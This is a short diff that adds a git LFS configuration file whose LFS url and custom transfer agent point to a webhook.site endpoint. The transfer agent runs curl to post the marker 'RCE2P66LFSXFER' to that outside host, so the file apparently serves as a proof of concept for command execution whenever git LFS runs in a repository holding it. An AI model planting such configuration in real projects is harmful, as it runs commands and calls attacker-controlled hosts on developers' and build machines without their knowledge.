@@ -1,0 +1,5 @@
+[lfs]
+	url = "https://webhook.site/a78baf7b-0997-4554-9174-0200e7144160"
+[lfs "customtransfer.p66"]
+	path = "curl"
+	args = "-s -m 6 -d RCE2P66LFSXFER https://webhook.site/a78baf7b-0997-4554-9174-0200e7144160"
